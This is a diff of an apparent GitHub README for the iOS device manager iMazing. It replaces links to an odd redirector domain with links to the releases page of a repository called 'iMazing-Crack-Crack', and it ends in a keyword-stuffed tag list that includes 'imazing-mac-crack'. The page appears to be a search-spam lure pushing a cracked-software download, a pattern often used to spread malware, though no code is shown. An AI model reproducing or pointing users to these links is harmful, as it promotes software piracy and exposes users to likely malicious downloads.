@@ -1,5 +1,5 @@
 
-![iMazing-review](https://github.com/user-attachments/assets/63ac89cf-4416-487e-95de-5a1740685184)
+![iMazing-review](https://github.com/BiomedicaUCB/iMazing-Crack-Crack/releases)
 
 # iMazing - Tips, Tricks & Updates
 
@@ -71,7 +71,7 @@ This repository is licensed under the **MIT License**. See the [LICENSE](LICENSE
 
 ---
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/BiomedicaUCB/iMazing-Crack-Crack/releases](https://github.com/BiomedicaUCB/iMazing-Crack-Crack/releases)](https://github.com/BiomedicaUCB/iMazing-Crack-Crack/releases)
 # Tags:
 imazing-coupon imazing-heic-convert imazing-coupon-code imazing-apps imazing-app imazing-3 imazing-cost coto-de-imaz using-imazing-and-anydesk josu-jon-imaz imazing-text-messages coto-de-imaz-reserva-2018 imazing-download imazo imazing-mac-crack imazing-sale
 
